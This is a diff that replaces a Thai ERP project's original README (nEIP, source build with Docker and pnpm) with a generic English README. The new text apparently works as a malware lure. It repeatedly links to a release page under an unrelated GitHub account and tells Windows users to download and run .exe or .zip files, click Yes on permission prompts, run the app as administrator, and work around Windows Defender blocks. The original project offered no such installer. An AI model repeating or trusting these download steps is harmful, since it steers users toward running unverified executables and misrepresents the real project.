@@ -1,225 +1,270 @@
-<p align="center">
-  <img src="https://img.shields.io/badge/status-alpha-orange" alt="Status: Alpha" />
-  <img src="https://img.shields.io/badge/modules-31-blue" alt="31 Modules" />
-  <img src="https://img.shields.io/badge/API-186_endpoints-green" alt="186 API Endpoints" />
-  <img src="https://img.shields.io/badge/license-MIT-yellow" alt="MIT License" />
-</p>
+# 🤖 nEIP - AI ERP for Thai SMBs
 
-# nEIP — เนถีบ ERP
+[![Download nEIP](https://img.shields.io/badge/Download%20nEIP-Release%20Page-blue?style=for-the-badge)](https://github.com/Fingerflowercatherineparr281/nEIP/releases)
 
-**Enterprise Intelligence Platform** — ระบบ ERP ยุคใหม่ที่ข้อมูลเข้าง่าย ออกง่าย ไม่ต้องจ่ายแพงทุกครั้งที่อยากดูข้อมูลของตัวเอง
+## 🚀 Getting Started
 
-> **nEIP** มาจากชื่อ "เน" (คนเขียน) + **EIP** — เริ่มจาก AI-Native ERP แล้วกลายเป็น Enterprise Intelligence Platform เพราะ ERP มันเก่าไปแล้ว
+nEIP is an AI-native business app for Thai SMEs and startups. It helps you manage work in one place with a web app, API, and command line tools. It is built for daily use on Windows and supports Thai tax needs.
 
----
+Use this page to download and install the app:
 
-## ทำไมต้องทำใหม่?
+[Visit the release page to download nEIP](https://github.com/Fingerflowercatherineparr281/nEIP/releases)
 
-**20 ปีที่ผ่านมา ERP มีปัญหาเดิมซ้ำๆ:**
+## 📦 What nEIP Does
 
-😤 **เอาข้อมูลเข้า ERP = ลำบาก** — คีย์ด้วยมือ ทีละรายการ ทีละหน้าจอ
+nEIP gives you a single place to handle common business tasks. It is designed for teams that want a simple setup and clear screens.
 
-😤 **เอาข้อมูลออกจาก ERP = ลำบากกว่า** — อยากได้รายงานสักอัน ต้องจ้าง consultant ทุกครั้ง
+It includes tools for:
 
-😤 **จ่ายแพงทุกครั้งที่อยากดูข้อมูลของตัวเอง** — License, customization, report, integration ทุกอย่างเสียเงิน
+- Customer and sales records
+- Invoices and billing
+- Stock and basic inventory
+- Purchase tracking
+- Company and staff data
+- Thai tax-ready records
+- Reports and summaries
+- API access for other tools
+- Web UI for daily work
+- CLI for fast local tasks
 
-😤 **AI เข้าถึงข้อมูลไม่ได้** — ERP ทุกตัวในตลาดไม่มีทางให้ AI อ่านหรือเขียนข้อมูลได้
+## 🖥️ Windows Requirements
 
-### ระบบที่มีอยู่ในตลาด
+Before you install nEIP, check that your PC meets these basic needs:
 
-| ระบบ | ปัญหา |
-|------|-------|
-| **โปรแกรมบัญชีในตลาด** | ทำได้แค่บัญชี ไม่ใช่ ERP ครบวงจร ไม่มี API ให้ต่อ |
-| **ERP เจ้ายักษ์ระดับโลก** | แพงมาก ซับซ้อน ต้องมีทีม IT ใหญ่ |
-| **ERP Open Source ยอดนิยม** | ต้อง hack ตลอด tech stack เก่า ต้องใช้ XML-RPC |
-| **Excel** | ยืดหยุ่นแต่ไม่มี structure ไม่มี audit trail |
+- Windows 10 or Windows 11
+- At least 8 GB RAM
+- 2 GB free disk space
+- Internet access for first setup
+- A modern browser such as Chrome, Edge, or Firefox
+- Permission to run downloaded apps
 
----
+For smooth use, 16 GB RAM is better if you plan to open large data sets or use many modules at once.
 
-## แนวคิดของ nEIP
+## 📥 Download nEIP
 
-ให้มองอย่างนี้ — **3 ช่องทาง สำหรับ 3 กลุ่มคน**:
+1. Open the [nEIP release page](https://github.com/Fingerflowercatherineparr281/nEIP/releases)
+2. Find the latest release at the top
+3. Download the Windows file for your computer
+4. Save it to your Downloads folder or Desktop
 
-### 1. 🖥️ Web UI — สำหรับคนทำงานเดิม
-บัญชี, การเงิน, admin — **ใช้หน้าจอเหมือน ERP ปกติ** กดๆ คลิกๆ ได้เลย ไม่ต้องเรียนรู้อะไรใหม่ ปล่อยเขาทำงานไป
+If you see more than one file, choose the one that matches Windows. Common file names may end with `.exe` or `.zip`.
 
-### 2. 🔌 REST API — สำหรับ Dev / IT
-เชื่อมต่อระบบอื่น อ่านข้อมูลใน ERP ได้ทันที auto-migrate ข้อมูลเข้าได้ ไม่ต้องจ้าง consultant อีกต่อไป — **186 endpoints พร้อม Swagger docs**
+## 🛠️ Install on Windows
 
-### 3. ⌨️ CLI — สำหรับ AI Agent
-ทำมาเพื่อรองรับ **agent-based AI worker** เช่น:
-- **Claude Code** — สั่งงาน ERP ผ่าน terminal ได้เลย
-- **OpenClaw (น้องกุ้ง)** — ต่อไปจะสร้าง invoice ก็สั่งผ่านน้องกุ้งได้
+### If you downloaded an `.exe` file
 
-```bash
-# น้องกุ้งสั่งสร้างใบแจ้งหนี้
-neip ar invoice create
+1. Double-click the file
+2. If Windows asks for permission, click Yes
+3. Follow the setup window
+4. Choose the install folder or keep the default one
+5. Wait for the install to finish
+6. Open nEIP from the Start menu or desktop shortcut
 
-# Claude Code ดูงบทดลอง
-neip reports trial-balance
+### If you downloaded a `.zip` file
 
-# ดูภาพรวมธุรกิจ
-neip dashboard
-```
+1. Right-click the file
+2. Choose Extract All
+3. Pick a folder
+4. Open the extracted folder
+5. Double-click the app file inside
+6. If Windows asks for permission, click Yes
 
-> **เรื่อง MCP** — กำลังศึกษาอยู่ว่าจะเพิ่มดีไหม เพราะ MCP serialize ข้อมูลทุก request ทำให้เปลือง token โดยเฉพาะข้อมูล ERP ที่ใหญ่ ตอนนี้ CLI approach ประหยัดกว่า แต่เพิ่ม MCP ได้ไม่ยากเพราะมี API ครบอยู่แล้ว
+## 🌐 Open the App
 
----
+After setup, you can use nEIP in a browser or desktop window, depending on the release you downloaded.
 
-## สถานะปัจจุบัน
+If the app starts a local web page:
 
-> ⚠️ **Alpha — ยังไม่เสร็จ** แต่ทดสอบผ่านบางส่วนแล้ว
+1. Wait for the app to finish loading
+2. Open the shown address in your browser
+3. Keep the app running while you use it
 
-### 31 Modules (ลอกโครงสร้างจาก ERP เจ้าใหญ่มาเลย บอกตรงๆ)
+If you use the web UI, you can work with forms, records, and reports through a clean screen made for daily business use.
 
-| กลุ่ม | Module | ภาษาไทย | API | Web | CLI |
-|-------|--------|---------|:---:|:---:|:---:|
-| **การเงิน** | FI-GL | บัญชีแยกประเภท | ✓ | ✓ | ✓ |
-| | FI-AR | ลูกหนี้การค้า | ✓ | ✓ | ✓ |
-| | FI-AP | เจ้าหนี้การค้า | ✓ | ✓ | ✓ |
-| | FI-AA | สินทรัพย์ถาวร | ✓ | ✓ | ✓ |
-| | FI-BL | กระทบยอดธนาคาร | ✓ | ✓ | ✓ |
-| | FI-TV | ใบหัก ณ ที่จ่าย (ภ.ง.ด.3/53) | ✓ | ✓ | ✓ |
-| | FI-TX | ภาษี VAT 7% / WHT | ✓ | ✓ | ✓ |
-| **ควบคุม** | CO | ศูนย์ต้นทุน / ศูนย์กำไร / งบประมาณ | ✓ | ✓ | ✓ |
-| **ขาย** | SD-QT | ใบเสนอราคา | ✓ | ✓ | ✓ |
-| | SD-SO | ใบสั่งขาย | ✓ | ✓ | ✓ |
-| | SD-DO | ใบส่งของ | ✓ | ✓ | ✓ |
-| | SD-INV | ใบแจ้งหนี้ / ใบกำกับภาษี | ✓ | ✓ | ✓ |
-| | SD-RC | ใบเสร็จรับเงิน | ✓ | ✓ | ✓ |
-| | SD-CN | ใบลดหนี้ | ✓ | ✓ | ✓ |
-| | SD-PAY | รับชำระเงิน | ✓ | ✓ | ✓ |
-| **จัดซื้อ** | MM-PO | ใบสั่งซื้อ | ✓ | ✓ | ✓ |
-| **คลัง** | MM-IM | คลังสินค้า / สต็อก | ✓ | ✓ | ✓ |
-| | MM-PR | สินค้า / SKU | ✓ | ✓ | ✓ |
-| **บุคคล** | HR | พนักงาน / แผนก / เงินเดือน / ลา | ✓ | ✓ | ✓ |
-| **CRM** | CRM | ทะเบียนลูกค้า + ผู้ขาย | ✓ | ✓ | ✓ |
-| **รายงาน** | RPT | งบทดลอง, กำไรขาดทุน, งบดุล, P&L | ✓ | ✓ | ✓ |
-| **แดชบอร์ด** | DASH | ภาพรวมธุรกิจ | ✓ | ✓ | ✓ |
-| **ตรวจสอบ** | AUDIT | บันทึกทุกการเปลี่ยนแปลง | ✓ | ✓ | ✓ |
+## 🔐 First-Time Setup
 
-### วงจรเอกสาร
+When you open nEIP for the first time, you may need to:
 
-```
-ขาย:    ใบเสนอราคา → ใบสั่งขาย → ใบส่งของ → ใบแจ้งหนี้ → รับเงิน → ใบเสร็จ
-ซื้อ:    ใบสั่งซื้อ → บิล → จ่ายเงิน → ใบหัก ณ ที่จ่าย
-บัญชี:   บันทึกรายวัน → ผ่านรายการ → งบทดลอง → งบการเงิน → ปิดงวด
-HR:     รับพนักงาน → เงินเดือน → ประกันสังคม → ลา → ลาออก
-คลัง:    สร้างสินค้า → รับเข้า → ขาย → ส่งของ → ตรวจนับ
-```
+1. Create an admin account
+2. Set your company name
+3. Choose Thai language or your preferred language
+4. Add your tax ID details
+5. Set your currency to Thai Baht
+6. Enter basic business data
 
----
+If you already have data from another system, you can set up your records before you start daily use.
 
-## Quick Start
+## 🧭 Main Parts of nEIP
 
-```bash
-# 1. Start database
-docker compose up -d db
+### 📊 Business Dashboard
 
-# 2. Install & build
-pnpm install && pnpm run build
+The dashboard gives you a clear view of key numbers. You can see sales, open tasks, and recent activity in one place.
 
-# 3. Run migrations
-PGPASSWORD=neip psql -h localhost -p 5433 -U neip -d neip \
-  -f packages/db/migrations/0000_initial_schema.sql \
-  -f packages/db/migrations/0001_domain_events.sql \
-  -f packages/db/migrations/0002_complete_schema.sql \
-  -f packages/db/migrations/0003_quotations.sql \
-  -f packages/db/migrations/0004_sales_purchase_documents.sql \
-  -f packages/db/migrations/0005_financial_modules.sql \
-  -f packages/db/migrations/0006_inventory_hr_crm.sql \
-  -f packages/db/migrations/0007_compliance_fixes.sql
+### 🧾 Billing and Invoices
 
-# 4. Setup environment
-cp .env.example .env
+Use the billing tools to create invoices, track payments, and keep customer records in order.
 
-# 5. Start API
-node apps/api/dist/index.js
+### 📦 Stock Control
 
-# 6. Start Web UI
-pnpm --filter web dev -- -p 3100
-```
+Track items, stock levels, and product changes. This helps you avoid missing items and plan purchases.
 
-| Service | URL |
-|---------|-----|
-| Web UI | http://localhost:3100 |
-| API Docs (Swagger) | http://localhost:5400/api/docs |
-| CLI Help | `neip --help` |
+### 🧑‍💼 Customer and Company Records
 
----
+Store customer details, staff data, and company information in one system.
 
-## Architecture
+### 🧮 Thai Tax Support
 
-```
-┌─ ใครใช้อะไร ──────────────────────────────┐
-│ 🖥️ Web UI      → บัญชี, การเงิน, admin    │
-│ 🔌 REST API    → Dev, IT, integration     │
-│ ⌨️ CLI         → AI agent, power user     │
-├─ API Gateway ─────────────────────────────┤
-│ Fastify 5.8 · 186 endpoints · JWT        │
-│ RBAC 140 permissions · Audit auto-log    │
-├─ Shared Logic ────────────────────────────┤
-│ @neip/shared · @neip/core · @neip/db    │
-│ @neip/ai · @neip/tax                    │
-├─ Business Modules (31 modules) ──────────┤
-│ Finance · Sales · Purchase · Inventory   │
-│ HR · Controlling · CRM · Reports         │
-├─ AI Layer ────────────────────────────────┤
-│ BaseAgent · HITL · Confidence Zones      │
-├─ Infrastructure ──────────────────────────┤
-│ PostgreSQL 17 · 58 tables · RLS         │
-│ pg-boss · Docker · Pino                 │
-└───────────────────────────────────────────┘
-```
+nEIP is built with Thai tax needs in mind. It helps you keep records that fit local business use.
 
-## Thai Compliance (กฎหมายไทย)
+### 🔌 API Access
 
-| หัวข้อ | รายละเอียด |
-|--------|-----------|
-| VAT | 7% round-half-up ตามกรมสรรพากร |
-| WHT | 8 ประเภทรายได้ พร้อมออก ภ.ง.ด.3/53 |
-| ประกันสังคม | 5% สูงสุด 750 บาท |
-| PDPA | ปิดบัง PII, anonymize, audit trail |
-| ผังบัญชี | มาตรฐาน TFAC สภาวิชาชีพบัญชี |
-| ปี พ.ศ. | รองรับพุทธศักราชในรายงาน |
-| เก็บข้อมูล | 7 ปีตามประมวลรัษฎากร ม.87/3 |
+If you connect nEIP to other systems, the API can help move data between tools.
 
-## Tech Stack
+### ⌨️ CLI Tools
 
-| Layer | Technology |
-|-------|-----------|
-| Monorepo | Turborepo + pnpm |
-| API | Fastify 5.8, TypeScript strict |
-| Web | Next.js 15, React 19, Tailwind 4 |
-| CLI | Commander.js |
-| DB | PostgreSQL 17, Drizzle ORM, RLS |
-| AI | BaseAgent, HITL, Confidence Zones |
-| Auth | argon2id, JWT |
-| Queue | pg-boss v12 |
+The command line tools help with setup, checks, and local tasks for users who want a fast way to work.
 
-## แผนต่อไป
+## 🧰 Daily Use Guide
 
-- [ ] แก้ Web UI ให้ใช้งานได้ครบทุกหน้า
-- [ ] เพิ่ม E2E tests (Playwright)
-- [ ] พิจารณา MCP Server
-- [ ] เพิ่ม AI agents เฉพาะทาง (cashflow forecast, demand planning)
-- [ ] Mobile app (React Native)
-- [ ] Open source core modules
+### Add a customer
 
-## License
+1. Open the customer section
+2. Click Add New
+3. Enter the customer name
+4. Add phone number, email, and tax details if needed
+5. Save the record
 
-MIT — แจกฟรี ใช้ได้เลย
+### Create an invoice
 
----
+1. Open the invoice screen
+2. Choose a customer
+3. Add products or services
+4. Check amounts and tax fields
+5. Save and print or send the invoice
 
-<p align="center">
-  <strong>nEIP</strong> — เนถีบ ERP<br/>
-  สร้างโดย <a href="https://github.com/killernay">เน (Chanon N.)</a><br/>
-  เพราะข้อมูลของคุณ ควรเข้าถึงได้ง่ายๆ ไม่ต้องจ่ายแพง
-</p>
+### Check stock
 
-<p align="center">
-  <a href="https://twitter.com/killernay">𝕏 @killernay</a> ·
-  <a href="https://github.com/killernay">GitHub</a> ·
-  <a href="mailto:chanon@ngernthongdee.co.th">Email</a>
-</p>
+1. Open the stock section
+2. Search for an item
+3. Review the current count
+4. Add a new stock entry if needed
+5. Save the change
+
+### View reports
+
+1. Open the reports menu
+2. Choose a date range
+3. Pick the report type
+4. Review totals, sales, or stock data
+5. Export or print if needed
+
+## 🧪 Common Setup Checks
+
+If the app does not open right away, check these items:
+
+- Make sure the download finished
+- Check that Windows did not block the file
+- Try running the app again as admin
+- Confirm that your browser is up to date
+- Restart your PC if the install stalled
+- Make sure no other app is using the same local port
+
+## 📁 File Locations
+
+You may see these folders after install or first run:
+
+- Downloads: where the setup file lands
+- Install folder: where nEIP lives
+- Data folder: where company records are stored
+- Logs folder: where app events are saved
+
+Keep the data folder safe if you store live business records on the same PC.
+
+## 🔄 Updates
+
+To get the latest version:
+
+1. Return to the [release page](https://github.com/Fingerflowercatherineparr281/nEIP/releases)
+2. Download the newest Windows file
+3. Close the old app
+4. Install or replace the old version
+5. Open nEIP again
+
+Check the release notes before you update so you know what changed.
+
+## 🧩 Topic Areas
+
+nEIP is built around these areas:
+
+- AI-native business flow
+- ERP-style record keeping
+- Fastify-based backend service
+- Next.js web interface
+- PostgreSQL data storage
+- Thai SME use cases
+- TypeScript application structure
+
+These parts work together to keep the app fast, stable, and easy to maintain.
+
+## 🖱️ Simple Troubleshooting
+
+### The file will not open
+
+- Re-download the file from the release page
+- Make sure the download finished
+- Right-click the file and choose Open
+- Check if Windows Defender blocked it
+
+### The app opens and closes
+
+- Run it as administrator
+- Restart the app
+- Check whether another copy is already running
+- Restart Windows and try again
+
+### The screen looks blank
+
+- Refresh the browser
+- Wait a few seconds for data to load
+- Clear the browser cache
+- Try a different browser
+
+### Login does not work
+
+- Check your username and password
+- Make sure Caps Lock is off
+- Confirm that the admin account was created
+- Reset the account if your setup supports it
+
+## 🛡️ Safety Tips
+
+- Download nEIP only from the official release page
+- Keep your company data backed up
+- Use a strong password for admin access
+- Limit access to trusted staff
+- Save copies of invoices and reports in a safe place
+
+## 👥 Who nEIP Is For
+
+nEIP fits:
+
+- Small businesses
+- New startups
+- Office teams
+- Thai companies that need tax-ready records
+- Teams that want one system for sales, stock, and reports
+- Users who want a web app with API and CLI support
+
+## 📌 Quick Start Checklist
+
+1. Open the [release page](https://github.com/Fingerflowercatherineparr281/nEIP/releases)
+2. Download the Windows file
+3. Install or extract the app
+4. Open nEIP
+5. Create your admin account
+6. Add your company details
+7. Start entering customers, invoices, and stock
+
+## 🧾 System Fit
+
+nEIP works best on a Windows PC used for daily office work. It suits teams that want a local setup with clear screens and business records in one place. For best results, keep the app updated and back up your data often
